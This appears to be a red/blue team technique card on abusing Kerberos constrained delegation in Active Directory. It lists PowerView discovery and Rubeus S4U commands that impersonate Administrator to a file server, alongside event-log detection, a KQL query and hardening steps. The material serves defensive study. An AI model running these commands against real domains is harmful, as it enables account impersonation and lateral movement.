# [CA-KERB-006]: Constrained Delegation Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-006 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Abuse of the Service-for-User-to-Proxy (S4U2Proxy) extension. If an attacker controls an account configured for Constrained Delegation (allowed to delegate to specific SPNs), they can impersonate *any* user to those specific services. With "Protocol Transition" (S4U2Self), they can impersonate a user even without that user authenticating first.
- **Attack Surface:** Accounts with `msDS-AllowedToDelegateTo` attribute populated.
- **Business Impact:** **Lateral Movement**. Often leads to full system compromise of the target server (e.g., impersonating Admin to CIFS).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised Account with Delegation rights.
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [Kekeo](https://github.com/gentilkiwi/kekeo)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Discovery**
Find accounts with constrained delegation.
```powershell
Get-DomainUser -TrustedToAuth
```

**Step 2: S4U2Self (Get Ticket for Self)**
As the compromised service, ask for a ticket for "Administrator" to yourself.
```powershell
.\Rubeus.exe s4u /user:websvc /rc4:HASH /impersonateuser:Administrator /self /ptt
```

**Step 3: S4U2Proxy (Delegate to Target)**
Use the ticket from Step 2 to ask for a ticket to the target service (e.g., cifs/file-server).
```powershell
.\Rubeus.exe s4u /user:websvc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/file-server.target.local /ptt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Ticket Options: `0x40800000` (Forwardable), Transited Services populated. |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4769
| where Status == "0x0"
| where AdditionalInfo has "msDS-AllowedToDelegateTo"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Audit:** Review `msDS-AllowedToDelegateTo` on all accounts. Remove unused delegations.
*   **Protection:** "Protected Users" group members cannot be impersonated via delegation.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-KERB-001]
> **Next Logical Step:** [LAT-SMB-001]
